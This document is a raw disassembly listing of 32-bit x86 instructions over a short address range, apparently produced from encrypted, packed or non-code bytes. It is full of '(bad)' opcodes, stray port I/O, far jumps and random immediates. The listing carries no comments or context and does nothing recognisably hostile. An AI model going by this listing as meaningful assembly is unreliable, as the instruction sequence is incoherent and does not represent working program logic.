  41fd7d:	ficom  DWORD PTR [esi]
  41fd7f:	mov    ebp,0xc117a824
  41fd84:	(bad)  
  41fd85:	pop    ds
  41fd86:	xor    eax,0x57817d0f
  41fd8b:	iret   
  41fd8c:	jbe    0x41fde4
  41fd8e:	pushf  
  41fd8f:	mov    ds:0x4afd999a,al
  41fd94:	mov    bh,0x57
  41fd96:	pop    es
  41fd97:	ja     0x41fd52
  41fd99:	iret   
  41fd9a:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41fd9c:	shl    bl,cl
  41fd9e:	pop    ebp
  41fd9f:	inc    eax
  41fda0:	push   0x5a23b892
  41fda5:	sub    esp,edi
  41fda7:	mov    dh,0xe5
  41fda9:	pop    esp
  41fdaa:	xchg   edx,eax
  41fdab:	sub    al,0x12
  41fdad:	jno    0x41fdf0
  41fdaf:	xor    al,0x83
  41fdb1:	jl     0x41fd50
  41fdb3:	jl     0x41fe02
  41fdb5:	ss cmp eax,0x3989523b
  41fdbb:	stos   DWORD PTR es:[edi],eax
  41fdbc:	out    dx,eax
  41fdbd:	jno    0x41fdb3
  41fdbf:	adc    al,0x57
  41fdc1:	aaa    
  41fdc2:	xchg   BYTE PTR [eax],ch
  41fdc4:	gs mov ebx,0xf487a1fd
  41fdca:	clc    
  41fdcb:	scas   al,BYTE PTR es:[edi]
  41fdcc:	gs xchg edi,eax
  41fdce:	std    
  41fdcf:	mov    ebx,0xe3fb62e6
  41fdd4:	xor    ch,ah
  41fdd6:	call   0x6765:0x1950acca
  41fddd:	pop    eax
  41fdde:	bound  edi,QWORD PTR [ecx+0x62]
  41fde1:	xchg   BYTE PTR [esi],dh
  41fde3:	pop    DWORD PTR [ecx+0x1f1c1fed]
  41fde9:	in     al,dx
  41fdea:	or     BYTE PTR [ecx+0x34],bh
  41fded:	mov    edi,0xfa60444e
  41fdf2:	loope  0x41fdfb
  41fdf4:	xor    esp,ebp
  41fdf6:	nop
  41fdf7:	xlat   BYTE PTR ds:[ebx]
  41fdf8:	icebp  
  41fdf9:	mov    ch,BYTE PTR [ebp+0x2c736112]
  41fdff:	mov    ah,0x7a
  41fe01:	fucomip st,st(3)
  41fe03:	ds jo  0x41fdb9
  41fe06:	mov    ecx,0xba054938
  41fe0b:	mov    al,ds:0xca186d84
  41fe10:	inc    eax
  41fe11:	mov    bh,0xc5
  41fe13:	xor    ecx,DWORD PTR [ebx+ebp*2]
  41fe16:	in     al,0x98
  41fe18:	rcl    BYTE PTR [edi+0x76],cl
  41fe1b:	js     0x41fdf5
  41fe1d:	into   
  41fe1e:	jne    0x41fe36
  41fe20:	add    eax,0x311dd6e3
  41fe25:	jp     0x41fe59
  41fe27:	outs   dx,BYTE PTR ds:[esi]
  41fe28:	data16 in al,dx
  41fe2a:	loop   0x41fdda
  41fe2c:	clc    
  41fe2d:	dec    ecx
  41fe2e:	daa    
  41fe2f:	xor    BYTE PTR [eax+0x1f],dh
  41fe32:	scas   eax,DWORD PTR es:[edi]
  41fe33:	dec    edx
  41fe34:	push   ds
  41fe35:	fldcw  WORD PTR [ebp+ebx*1-0x6f]
  41fe39:	lods   eax,DWORD PTR ds:[esi]
  41fe3a:	mov    al,0xcf
  41fe3c:	pop    edi
  41fe3d:	rcr    DWORD PTR [edi-0x3907be72],cl
  41fe43:	or     bh,dl
  41fe45:	sbb    eax,DWORD PTR [ecx-0x1d]
  41fe48:	jle    0x41fec7
  41fe4a:	out    dx,al
  41fe4b:	out    dx,eax
  41fe4c:	push   esp
  41fe4d:	jbe    0x41fe26
  41fe4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe50:	adc    BYTE PTR [esi],0xc
  41fe53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe54:	or     esp,DWORD PTR [edx]
  41fe56:	(bad)  
  41fe57:	es aaa 
  41fe59:	in     al,dx
  41fe5a:	pop    esp
  41fe5b:	mov    ebp,0xd4214ce9
  41fe60:	aas    
  41fe61:	test   ecx,edx
  41fe63:	pop    ebx
  41fe64:	ret    
  41fe65:	imul   esp,DWORD PTR [ecx-0x51817048],0xffffffe0
  41fe6c:	mov    bh,0xbe
  41fe6e:	rol    esi,1
  41fe70:	adc    esi,DWORD PTR [edi-0x1d21353e]
  41fe76:	dec    esi
  41fe77:	lahf   
  41fe78:	dec    esp
  41fe79:	aas    
  41fe7a:	sbb    al,0xd
  41fe7c:	shl    DWORD PTR [edx-0x5e],cl
  41fe7f:	add    ch,BYTE PTR [edx+0x68]
  41fe82:	data16 mov bh,0x6
  41fe85:	out    dx,eax
  41fe86:	addr16 pop esi
  41fe88:	adc    ecx,edi
  41fe8a:	lea    esp,[esi+eax*8+0x71129929]
  41fe91:	sub    BYTE PTR ds:0xb11485ec,cl
  41fe97:	pop    ebp
  41fe98:	rcr    BYTE PTR [edi+0x79],0x95
  41fe9c:	repnz les ebp,FWORD PTR [esi+0x21]
  41fea0:	xchg   ebp,eax
  41fea1:	ins    BYTE PTR es:[edi],dx
  41fea2:	pop    ss
  41fea3:	mov    BYTE PTR [edi-0xeed3032],dl
  41fea9:	fdiv   QWORD PTR [ebp-0x5ee02959]
  41feaf:	in     eax,dx
  41feb0:	mov    DWORD PTR [ecx+esi*4-0x43fab522],eax
  41feb7:	aas    
  41feb8:	popf   
  41feb9:	sti    
  41feba:	xchg   edi,eax
  41febb:	das    
  41febc:	stos   DWORD PTR es:[edi],eax
  41febd:	pop    esi
  41febe:	add    eax,0x7be04cbc
  41fec3:	imul   ecx,eax,0x19983e1a
  41fec9:	jmp    0x88f4:0x7aa3d87a
  41fed0:	inc    esi
  41fed1:	cmp    al,0xe3
  41fed3:	iret   
  41fed4:	fsub   DWORD PTR [ebp+0x387e75cc]
  41feda:	jmp    0x41ff4b
  41fedc:	cli    
  41fedd:	data16 mov ch,0x1a
  41fee0:	mov    esi,0x1a2ceeb0
  41fee5:	stos   DWORD PTR es:[edi],eax
  41fee6:	sub    eax,0xcdbe1369
  41feeb:	cdq    
  41feec:	bound  si,DWORD PTR [edi+0xd]
  41fef0:	vorps  xmm1,xmm4,XMMWORD PTR [eax+ebp*1-0x64]
  41fef6:	int3   
  41fef7:	mov    ebp,0x7464b299
  41fefc:	mov    ds:0x6f532190,eax
  41ff01:	sti    
  41ff02:	jecxz  0x41ff47
  41ff04:	dec    esp
  41ff05:	ret    0x2240
  41ff08:	dec    esi
  41ff09:	sbb    al,0xa2
  41ff0b:	(bad)  
  41ff0c:	pop    esi
  41ff0d:	fldenv [esi]
  41ff0f:	sbb    DWORD PTR [ebx-0x57],ecx
  41ff12:	in     al,dx
  41ff13:	fild   DWORD PTR [ecx]
  41ff15:	mov    ds:0x1c3d3163,eax
  41ff1a:	push   ecx
  41ff1b:	repz dec esi
  41ff1d:	pop    ds
  41ff1e:	cmp    eax,0xc0742089
  41ff23:	pop    ecx
  41ff24:	or     eax,0xf15de27f
  41ff29:	cdq    
  41ff2a:	out    0x2e,al
  41ff2c:	sub    BYTE PTR [edi+0x30],al
  41ff2f:	fistp  QWORD PTR [ebx]
  41ff31:	jmp    0xaf0f:0xe3165956
  41ff38:	mov    ebp,0x69411f6
  41ff3d:	mov    ebx,0xc8ba33ce
  41ff42:	fcom   QWORD PTR [esi]
  41ff44:	outs   dx,BYTE PTR ds:[esi]
  41ff45:	mov    bh,0x15
  41ff47:	sbb    BYTE PTR [eax+0x576c7477],bh
  41ff4d:	adc    esp,DWORD PTR [edi+0x8]
  41ff50:	rcr    BYTE PTR [edx-0x1f],0x29
  41ff54:	imul   edx,DWORD PTR [edx+ebp*1-0x183920ab],0x1a
  41ff5c:	fimul  WORD PTR [esi]
  41ff5e:	inc    eax
  41ff5f:	push   ss
  41ff60:	pop    esp
  41ff61:	and    al,0xb2
  41ff63:	(bad)  
  41ff64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff66:	fnsave [ecx-0x130417d6]
  41ff6c:	or     BYTE PTR [eax+0x43],dl
  41ff6f:	xchg   edi,eax
  41ff70:	mov    edi,0x13665495
  41ff75:	sub    BYTE PTR [edx],cl
  41ff77:	dec    esp
  41ff79:	popf   
  41ff7a:	test   eax,0xc07cd9e1
  41ff7f:	xor    BYTE PTR [edx+0x5d],dl
  41ff82:	sub    DWORD PTR [edx+eax*4],ecx
  41ff85:	mov    dl,0x35
  41ff87:	cmp    al,0x24
  41ff89:	cmp    al,0x42
  41ff8b:	into   
  41ff8c:	mov    ecx,edi
  41ff8e:	or     bl,BYTE PTR [edi]
  41ff90:	sbb    al,0x63
  41ff92:	sbb    BYTE PTR [ebp-0x4debbc5c],ch
  41ff98:	popa   
  41ff99:	sbb    esp,esi
  41ff9b:	(bad)  
  41ff9c:	pop    ebp
  41ff9d:	cmc    
  41ff9e:	inc    esi
  41ff9f:	jl     0x41ffcf
  41ffa1:	jmp    0x420007
  41ffa3:	jb     0x41ffb5
  41ffa5:	retf   
  41ffa6:	mov    esi,0x98281542
  41ffab:	inc    ebp
  41ffac:	sbb    eax,0xe9cef2cb
  41ffb1:	test   DWORD PTR [ebx],esi
  41ffb3:	pop    eax
  41ffb4:	inc    eax
  41ffb5:	sbb    ebx,DWORD PTR [edx]
  41ffb7:	pusha  
  41ffb8:	call   0xeef017a2
  41ffbd:	adc    edx,esp
  41ffbf:	(bad)  
  41ffc0:	cmp    al,0x9b
  41ffc2:	add    BYTE PTR [ebx+0x77],al
  41ffc5:	inc    ebp
  41ffc6:	ret    
  41ffc7:	jecxz  0x42002b
  41ffc9:	add    eax,edx
  41ffcb:	inc    eax
  41ffcc:	push   0x7ec16e88
  41ffd1:	add    bh,dh
  41ffd3:	test   al,0xd0
  41ffd5:	daa    
  41ffd6:	(bad)  
  41ffd7:	shl    BYTE PTR [ebx-0x61596652],cl
  41ffdd:	adc    al,0x3f
  41ffdf:	ja     0x41ff87
  41ffe1:	lahf   
  41ffe2:	mov    al,ds:0xc3f442f9
  41ffe7:	out    dx,al
  41ffe8:	jne    0x42003f
  41ffea:	mov    bh,0xa6
  41ffec:	mov    dl,BYTE PTR [ebx+0x7f]
  41ffef:	fwait
  41fff0:	cli    
  41fff1:	scas   al,BYTE PTR es:[edi]
  41fff2:	shr    ebp,cl
  41fff4:	add    eax,DWORD PTR [ebp+0xd9b2d9e]
  41fffa:	mov    esi,0x22beb7ee
  41ffff:	adc    edi,edi
  420001:	pop    ebx
  420002:	iret   
  420003:	enter  0xdaeb,0x45
  420007:	mov    bl,0xea
  420009:	cwde   
  42000a:	mov    dh,0xaa
  42000c:	sbb    BYTE PTR es:[ecx+0x55],ah
  420010:	clc    
  420011:	(bad)  [eax-0x55]
  420014:	or     dl,BYTE PTR [esi-0x11d917c7]
  42001a:	mov    cl,0xf1
  42001c:	retf   
  42001d:	mov    ah,0x5b
  42001f:	xlat   BYTE PTR ds:[ebx]
  420020:	push   esp
  420021:	sti    
  420022:	pop    ds
  420023:	jmp    0x420078
  420025:	xchg   ecx,eax
  420026:	test   eax,0xfbca5725
  42002b:	test   al,0x55
  42002d:	inc    BYTE PTR [edi]
  42002f:	out    dx,al
  420030:	mov    cl,0x22
  420032:	cmp    eax,0xf6f851a3
  420037:	mov    dl,0xc3
  420039:	pop    ds
  42003a:	sar    BYTE PTR [eax],cl
  42003c:	je     0x41ffff
  42003e:	out    dx,al
  42003f:	aad    0x8b
  420041:	mov    ah,0xd5
  420043:	repnz cdq 
  420045:	jg     0x420063
  420047:	pop    eax
  420048:	jge    0x420072
  42004a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42004b:	fnsave ds:0xd01d3068
  420051:	aaa    
  420052:	shl    ch,cl
  420054:	fwait
  420055:	sbb    dl,BYTE PTR [ecx]
  420057:	sbb    eax,0xee3b3796
  42005c:	mov    ch,0x36
  42005e:	xor    bh,BYTE PTR [edx+0x44]
  420061:	pop    esi
  420062:	les    esi,FWORD PTR [ecx-0x20b5eddd]
  420068:	mov    edi,0xda4468d6
  42006d:	shl    BYTE PTR [ecx],cl
  42006f:	(bad)  
  420070:	mov    esi,0xb5408c08
  420075:	jbe    0x42004e
  420077:	and    al,0xf1
  420079:	dec    esi
  42007a:	lahf   
  42007b:	fnstsw WORD PTR [edx]
  42007d:	cmovae esi,eax
  420080:	repnz dec edi
  420082:	sbb    DWORD PTR [ecx+0x2f784b6e],ecx
  420088:	xor    esi,DWORD PTR [eax]
  42008a:	not    DWORD PTR [ecx]
  42008c:	into   
  42008d:	add    eax,0x44523a6a
  420092:	out    0x1d,al
  420094:	lods   eax,DWORD PTR ds:[esi]
  420095:	mov    ebp,0xbb2ed1d9
  42009a:	pop    dx
  42009c:	ins    DWORD PTR es:[edi],dx
  42009d:	xchg   esi,eax
  42009e:	mov    al,cs:0x89753a6
  4200a4:	dec    ebx
  4200a5:	iret   
  4200a6:	loopne 0x42005b
  4200a8:	add    al,0xdd
  4200aa:	or     BYTE PTR [edi-0x7f],0x70
  4200ae:	dec    edi
  4200af:	push   0x7e
  4200b1:	test   eax,0xbd6cc487
  4200b6:	aad    0x52
  4200b8:	xor    edx,DWORD PTR [esi-0x6e]
  4200bb:	mov    DWORD PTR [esi+0x34],edi
  4200be:	jbe    0x42006c
  4200c0:	ret    
  4200c1:	test   edx,0x401bf17a
  4200c7:	sub    BYTE PTR [ebx-0x4e],0x63
  4200cb:	or     edi,eax
  4200cd:	lahf   
  4200ce:	xchg   esi,eax
  4200cf:	ror    DWORD PTR [ebx-0x485e1acd],0x61
  4200d6:	sbb    DWORD PTR [edx],esp
  4200d8:	inc    edx
  4200d9:	push   cs
  4200da:	jb     0x420081
  4200dc:	icebp  
  4200dd:	jae    0x4200b1
  4200df:	rol    bh,cl
  4200e1:	sub    ch,BYTE PTR es:[eax+0x6c]
  4200e5:	(bad)  
  4200e6:	and    DWORD PTR [edi],ebx
  4200e8:	aaa    
  4200e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200ea:	shr    DWORD PTR [esi+0x69],1
  4200ed:	repz call 0xfd087b61
  4200f3:	rcl    bh,0x56
  4200f6:	jmp    0x29d:0xeb5937c
  4200fd:	shl    edi,1
  4200ff:	jne    0x420144
  420101:	daa    
  420102:	fisttp WORD PTR [ebx]
  420104:	mov    ah,0x5d
  420106:	add    BYTE PTR [edx],0xb1
  420109:	jnp    0x42008d
  42010b:	ss (bad) 
  42010d:	cmp    eax,0x2c66e798
  420112:	sbb    al,0x84
  420114:	(bad)  
  420115:	arpl   bp,di
  420117:	xlat   BYTE PTR ds:[ebx]
  420118:	std    
  420119:	adc    al,0x58
  42011b:	retf   0xea6a
  42011e:	sahf   
  42011f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420120:	push   ss
  420121:	jg     0x420112
  420123:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420124:	jb     0x4200f3
  420126:	cmp    dh,BYTE PTR [eax]
  420128:	sbb    al,bh
  42012a:	outs   dx,DWORD PTR ds:[esi]
  42012b:	pop    ss
  42012c:	cmp    ch,BYTE PTR [ebx-0x6c438ed9]
  420132:	in     al,dx
  420133:	xor    eax,0xc0c08845
  420138:	stc    
  420139:	dec    edi
  42013a:	sbb    DWORD PTR [ebp+ecx*1+0x1f],ebp
  42013e:	ins    BYTE PTR es:[edi],dx
  42013f:	sub    dl,BYTE PTR [ebx+0x52]
  420142:	je     0x42017f
  420144:	popf   
  420145:	sub    DWORD PTR [ebx-0x1d47f147],eax
  42014b:	adc    BYTE PTR [ecx-0x2f],0x3c
  42014f:	sub    al,0xfc
  420151:	fisubr WORD PTR [esi+0x3]
  420154:	mov    ds:0x5f0170ea,eax
  420159:	sub    al,0x8a
  42015b:	repnz arpl cx,si
  42015e:	mov    dh,BYTE PTR [eax+0x4fcb1578]
  420164:	ins    BYTE PTR es:[edi],dx
  420165:	nop
  420166:	retf   
  420167:	adc    bl,cl
  420169:	cdq    
  42016a:	fiadd  DWORD PTR [edx-0x1600a8ae]
  420170:	inc    esi
  420171:	cs lahf 
  420173:	push   edi
  420174:	xchg   edx,eax
  420175:	in     eax,0xc3
  420177:	mov    al,0x92
  420179:	cld    
  42017a:	jb     0x4201cd
  42017c:	push   es
  42017d:	lods   al,BYTE PTR ds:[esi]
  42017e:	dec    ebp
  42017f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420180:	fiadd  WORD PTR [edx-0x5d6acff6]
  420186:	push   es
  420187:	call   0xc84dd80f
  42018c:	add    BYTE PTR [eax+ebx*4+0x7fe3223],bh
  420193:	push   cs
  420194:	loope  0x42013c
  420196:	or     ebp,DWORD PTR [ecx]
  420198:	(bad)  
  420199:	neg    DWORD PTR [ebx-0x1a7b642d]
  42019f:	scas   eax,DWORD PTR es:[edi]
  4201a0:	mov    edi,0x72d41a60
  4201a5:	sar    BYTE PTR [esp+ebp*8-0x14],cl
  4201a9:	mov    dh,0x23
  4201ab:	mov    bh,0xd7
  4201ad:	ds in  eax,dx
  4201af:	push   ds
  4201b0:	jl     0x4201b4
  4201b2:	mov    eax,ds:0xc9f2f07e
  4201b7:	fwait
  4201b8:	jl     0x42018c
  4201ba:	clc    
  4201bb:	and    ah,BYTE PTR [ebp+0x6b]
  4201be:	js     0x420167
  4201c0:	cmp    ebx,edx
  4201c2:	mov    bh,0x9
  4201c4:	lock rcr DWORD PTR [edi+eax*8-0x15],cl
  4201c9:	xchg   ebp,eax
  4201ca:	inc    edi
  4201cb:	sbb    edi,edi
  4201cd:	xchg   ecx,eax
  4201ce:	cmc    
  4201cf:	xchg   edx,eax
  4201d0:	stos   DWORD PTR es:[edi],eax
  4201d1:	nop
  4201d2:	in     al,dx
  4201d3:	push   edx
  4201d4:	cmp    DWORD PTR [ecx],eax
  4201d6:	cmc    
  4201d7:	pop    ebx
  4201d8:	aad    0xa1
  4201da:	mov    ecx,0x460e1020
  4201df:	xchg   ebx,eax
  4201e0:	inc    edx
  4201e1:	push   0x26
  4201e3:	imul   ebp,DWORD PTR [edi-0x5f],0x314d7843
  4201ea:	adc    BYTE PTR [ebx+0x3c62467d],ah
  4201f0:	mov    esp,0x9910108
  4201f5:	iret   
  4201f6:	xchg   ecx,eax
  4201f7:	jg     0x420238
  4201f9:	les    ebx,FWORD PTR ds:0x49c70a99
  4201ff:	es or  al,cl
  420202:	(bad)  
  420203:	jne    0x420261
  420205:	pop    ebx
  420206:	das    
  420207:	call   0x3da7519d
  42020c:	adc    eax,0xceb33bf6
  420211:	or     eax,0x5f0bdb10
  420216:	shl    DWORD PTR [edi+0x26],1
  420219:	and    al,0x8c
  42021b:	test   DWORD PTR [ebp+0x6cbda09],ebx
  420221:	jno    0x4201e6
  420223:	in     eax,dx
  420224:	pop    esp
  420225:	pop    esi
  420226:	pop    ss
  420227:	leave  
  420228:	mov    ds:0xe91d1722,al
  42022d:	or     eax,0xd26db516
  420232:	inc    ebp
  420233:	retf   
  420234:	and    al,0x12
  420236:	outs   dx,DWORD PTR ds:[esi]
  420237:	xchg   ebp,eax
  420238:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420239:	scas   eax,DWORD PTR es:[edi]
  42023a:	mov    al,0x50
  42023c:	push   es
  42023d:	xor    eax,0xf56d3847
  420242:	jno    0x420238
  420244:	mov    al,ds:0x2eb77351
  420249:	adc    DWORD PTR [edx],ebp
  42024b:	les    esi,FWORD PTR [edx]
  42024d:	and    eax,DWORD PTR [ecx]
  42024f:	pop    edi
  420250:	mov    edx,ecx
  420252:	mov    dl,0xe5
  420254:	mov    bh,BYTE PTR [ecx+eax*8]
  420257:	mov    al,ds:0xe8dc2b96
  42025c:	push   0xc6eafde6
  420261:	retf   0x7cb7
  420264:	and    DWORD PTR [eax],eax
  420266:	bound  edi,QWORD PTR [edi-0x35]
  420269:	jne    0x4202b8
  42026b:	ins    BYTE PTR es:[edi],dx
  42026c:	cdq    
  42026d:	data16 shr BYTE PTR [eax],1
  420270:	adc    dh,ch
  420272:	cmc    
  420273:	sub    cl,0x9e
  420276:	loop   0x4202b2
  420278:	mov    eax,ds:0xf5791b9e
  42027d:	inc    edx
  42027e:	pop    esp
  42027f:	or     al,0x92
  420281:	(bad)  
  420282:	enter  0x7bf,0xf8
  420286:	mov    al,BYTE PTR ds:0xe0a85fa2
  42028c:	xor    bh,BYTE PTR [esi]
  42028e:	jns    0x420217
  420290:	or     al,0x19
  420292:	push   esi
  420293:	sbb    bh,BYTE PTR [esi]
  420295:	sub    eax,0xdaf16bb5
  42029a:	jp     0x42031a
  42029c:	dec    eax
  42029d:	jo     0x4202d8
  42029f:	cld    
  4202a0:	pop    esi
  4202a1:	dec    esp
  4202a2:	push   esi
  4202a3:	xor    eax,0xf9d087db
  4202a8:	dec    eax
  4202a9:	dec    ecx
  4202aa:	jbe    0x4202f2
  4202ac:	ds or  eax,0x5769b77e
  4202b2:	and    BYTE PTR [ebp+edi*1+0x16281fea],ah
  4202b9:	pop    ds
  4202ba:	sbb    edi,esi
  4202bc:	adc    eax,0xee6b7c13
  4202c1:	fs lock (bad) 
  4202c5:	mov    edx,0x27639240
  4202ca:	add    eax,DWORD PTR [esi+esi*2-0x2fd8f660]
  4202d1:	(bad)  
  4202d2:	mov    dl,BYTE PTR [edx+0x57e51e38]
  4202d8:	mov    bh,0xd
  4202da:	sbb    BYTE PTR [edx-0x3a796c41],cl
  4202e0:	adc    BYTE PTR [ebx+0x44],0xe7
  4202e4:	hlt    
  4202e5:	and    eax,0x9759af0
  4202ea:	and    DWORD PTR [esi+0x13],eax
  4202ed:	outs   dx,DWORD PTR ss:[esi]
  4202ef:	inc    ebp
  4202f0:	lods   al,BYTE PTR ds:[esi]
  4202f1:	push   edx
  4202f2:	dec    edx
  4202f3:	out    dx,eax
  4202f4:	ss ins DWORD PTR es:[edi],dx
  4202f6:	stos   DWORD PTR es:[edi],eax
  4202f7:	sbb    al,BYTE PTR [ebx+ebx*8]
  4202fa:	in     al,0x8
  4202fc:	out    dx,al
  4202fd:	out    dx,eax
  4202fe:	inc    edx
  4202ff:	loop   0x420354
  420301:	and    BYTE PTR [edx+0x7e9f43ae],ch
  420307:	ins    DWORD PTR es:[edi],dx
  420308:	pop    esi
  420309:	test   ebx,ebx
  42030b:	or     ecx,eax
  42030d:	push   ss
  42030e:	ins    DWORD PTR es:[edi],dx
  42030f:	retf   0x1a11
  420312:	push   eax
  420313:	pop    eax
  420314:	iret   
  420315:	scas   al,BYTE PTR es:[edi]
  420316:	dec    ebx
  420317:	sbb    eax,0xf15b7569
  42031c:	daa    
  42031d:	in     eax,0x2a
  42031f:	mov    eax,ds:0x454be214
  420324:	dec    ebp
  420325:	jbe    0x420308
  420327:	out    0x1f,eax
  420329:	in     eax,0x1e
  42032b:	mov    WORD PTR [esi-0x3a146c85],ss
  420331:	aam    0xc4
  420333:	daa    
  420334:	cs jmp 0x3db8885a
  42033a:	add    al,0x6f
  42033c:	mov    eax,0x23e9eb4d
  420341:	test   al,ch
  420343:	push   es
  420344:	fnstenv [edi]
  420346:	sbb    eax,0xd6f8700b
  42034b:	shl    DWORD PTR [ecx+0x30],1
  42034e:	mov    ebp,0xe8c8bb06
  420353:	dec    esp
  420354:	sar    DWORD PTR [eax-0x9],cl
  420357:	jo     0x4203d5
  420359:	lds    edx,FWORD PTR [edi+esi*4]
  42035c:	push   ebx
  42035d:	ins    BYTE PTR es:[edi],dx
  42035e:	retf   0xbc43
  420361:	dec    ebp
  420362:	test   al,0xaa
  420364:	mov    ch,0x41
  420366:	pop    esp
  420367:	stc    
  420368:	popa   
  420369:	sbb    BYTE PTR [ebx+edx*1],bl
  42036c:	xchg   ecx,eax
  42036d:	or     eax,0xa9539259
  420372:	push   cs
  420373:	or     ch,dh
  420375:	or     DWORD PTR [ecx+0x1d],ecx
  420378:	or     DWORD PTR [ebx],0x8f993336
  42037e:	cmp    BYTE PTR [edx+0x3a76ef80],0xfa
  420385:	retf   
  420386:	mov    edx,0x454b321d
  42038b:	push   cs
  42038c:	push   edi
  42038d:	xchg   ebx,eax
  42038e:	dec    eax
  42038f:	mov    al,0x35
  420391:	push   ecx
  420392:	xchg   al,ah
  420394:	aas    
  420395:	jae    0x42039a
  420397:	dec    ebp
  420398:	sbb    edi,eax
  42039a:	jl     0x420348
  42039c:	pushf  
  42039d:	fidivr WORD PTR [ebp-0x1f]
  4203a0:	sbb    eax,0x6f8fa82c
  4203a5:	(bad)  
  4203a6:	push   edx
  4203a7:	sar    DWORD PTR [ecx],cl
  4203a9:	cmp    BYTE PTR [ebp-0x44ca4dfe],dh
  4203af:	je     0x420403
  4203b1:	aas    
  4203b2:	mov    gs,WORD PTR [esi+0x1d]
  4203b5:	xor    BYTE PTR [esi],0x2e
  4203b8:	mov    eax,ds:0xe8890015
  4203bd:	pusha  
  4203be:	jmp    0x420377
  4203c0:	dec    bl
  4203c2:	repz xor BYTE PTR [esi],al
  4203c5:	lods   eax,DWORD PTR ds:[esi]
  4203c6:	push   esi
  4203c7:	jecxz  0x4203ba
  4203c9:	push   cs
  4203ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203cb:	mov    dl,0xba
  4203cd:	adc    bh,BYTE PTR [esi]
  4203cf:	adc    ecx,DWORD PTR [eax]
  4203d1:	push   edi
  4203d2:	lds    edi,FWORD PTR [edx-0x6061fec2]
  4203d8:	mov    ecx,0xfa68d9fc
  4203dd:	in     eax,dx
  4203de:	out    dx,al
  4203df:	es jns 0x420399
  4203e2:	ins    DWORD PTR es:[edi],dx
  4203e3:	add    DWORD PTR [edi+0x693c6e02],edx
  4203e9:	add    eax,0xdaaff5b
  4203ee:	(bad)  
  4203ef:	out    0xfe,eax
  4203f1:	mov    edi,0x88f263d9
  4203f6:	das    
  4203f7:	call   0x8b395240
  4203fc:	lock shl BYTE PTR [ebp+eax*4-0x29],cl
  420401:	mov    dh,0x75
  420403:	(bad)  
  420404:	sbb    al,0x16
  420406:	pop    edi
  420407:	add    al,0x20
  420409:	adc    BYTE PTR [esi],bl
  42040b:	(bad)  
  42040c:	pusha  
  42040d:	sbb    DWORD PTR [esp+edi*8],eax
  420410:	bound  ebp,QWORD PTR [eax-0x76c06a09]
  420416:	adc    DWORD PTR [ecx+edx*1-0x3eb49ce],eax
  42041d:	push   ds
  42041e:	sti    
  42041f:	scas   al,BYTE PTR es:[edi]
  420420:	lahf   
  420421:	jnp    0x4203d8
  420423:	or     edx,edx
  420425:	std    
  420426:	ss push edi
  420428:	push   esp
  420429:	in     al,dx
  42042a:	je     0x420431
  42042c:	or     edx,DWORD PTR [ebx-0x7e3c0409]
  420432:	xor    eax,0x593d891d
  420437:	fs out 0x15,eax
  42043a:	pop    ds
  42043b:	jno    0x42044d
  42043d:	jmp    0xf561b282
  420442:	jo     0x420484
  420444:	and    al,0x42
  420446:	push   esi
  420447:	arpl   WORD PTR [esi-0x7addd78f],dx
  42044d:	loope  0x420487
  42044f:	cwde   
  420450:	sub    DWORD PTR [ecx],ebx
  420452:	enter  0x41b8,0xe8
  420456:	cli    
  420457:	outs   dx,DWORD PTR ds:[esi]
  420458:	fnstenv [esi]
  42045a:	in     eax,0x66
  42045c:	jb     0x42047d
  42045e:	pushf  
  42045f:	adc    eax,0x172211e0
  420464:	add    al,0x89
  420466:	push   es
  420467:	adc    bl,bl
  420469:	fild   QWORD PTR [eax]
  42046b:	push   0x4f6276b0
  420470:	ja     0x42045b
  420472:	popa   
  420473:	iret   
  420474:	pop    edi
  420475:	mov    dh,0xee
  420477:	mov    ch,0x74
  420479:	push   cs
  42047a:	lock and bl,dl
  42047d:	retf   
  42047e:	mov    eax,0x335e00ee
  420483:	lock xor DWORD PTR [esi+0x18bbccb1],0xcac8512f
  42048e:	in     al,0x62
  420490:	out    dx,eax
  420491:	dec    edx
  420492:	jns    0x4204c7
  420494:	outs   dx,DWORD PTR ds:[esi]
  420495:	pusha  
  420496:	or     BYTE PTR [eax],0x25
  420499:	stos   BYTE PTR es:[edi],al
  42049a:	pop    ss
  42049b:	fldcw  WORD PTR [ebp-0x37]
  42049e:	jmp    DWORD PTR [edi]
  4204a0:	or     esi,DWORD PTR [ebp-0x9]
  4204a3:	jmp    0x420427
  4204a5:	inc    edi
  4204a6:	sub    DWORD PTR [ecx-0x1a],0x8b6cbaa2
  4204ad:	push   edi
  4204ae:	mov    esp,0x87d55c77
  4204b3:	jmp    0xa52eab9b
  4204b8:	jmp    0xbd22aafd
  4204bd:	(bad)  
  4204be:	mov    bh,0x1f
  4204c0:	or     BYTE PTR [ebx-0x6c],0xd1
  4204c4:	psrlw  mm2,QWORD PTR [eax+0x47]
  4204c8:	push   edi
  4204c9:	jl     0x4204da
  4204cb:	outs   dx,BYTE PTR ds:[esi]
  4204cc:	out    0x3f,eax
  4204ce:	in     eax,0x7d
  4204d0:	and    DWORD PTR [esp+esi*8],ebp
  4204d3:	xchg   cl,ch
  4204d5:	jo     0x4204a1
  4204d7:	imul   esp,DWORD PTR [edx-0x3d1ae6f6],0x5d2e223b
  4204e1:	cmp    ebx,DWORD PTR [esi-0x7b]
  4204e4:	fistp  WORD PTR [esi]
  4204e6:	in     eax,0x3c
  4204e8:	lods   al,BYTE PTR ds:[esi]
  4204e9:	hlt    
  4204ea:	mov    dh,0xc4
  4204ec:	sub    dh,BYTE PTR [esi+0x43]
  4204ef:	ins    DWORD PTR es:[edi],dx
  4204f0:	sets   BYTE PTR [edi+esi*2]
  4204f4:	xlat   BYTE PTR ds:[ebx]
  4204f5:	jp     0x4204be
  4204f7:	pop    ecx
  4204f8:	add    eax,0x357fd11f
  4204fd:	inc    edi
  4204fe:	push   DWORD PTR [edx+0x5543c595]
